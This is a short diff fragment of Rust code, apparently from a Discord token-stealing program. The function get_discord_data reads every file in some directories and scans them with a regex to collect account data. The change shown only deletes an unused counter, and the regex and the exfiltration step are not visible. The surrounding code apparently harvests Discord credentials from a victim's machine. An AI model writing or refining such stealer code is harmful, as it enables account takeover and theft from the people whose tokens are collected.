@@ -220,9 +220,7 @@ pub async fn get_discord_data(client: &reqwest::Client) -> (Vec<DiscordAccount>,
             Ok(r) => r,
             Err(_) => continue,
         };
-        let mut entry_count = 0u32;
         for entry in entries.flatten() {
-            entry_count += 1;
             if let Ok(file_content) = fs::read(entry.path()) {
                 let text = String::from_utf8_lossy(&file_content);
                 for cap in re.captures_iter(&text) {
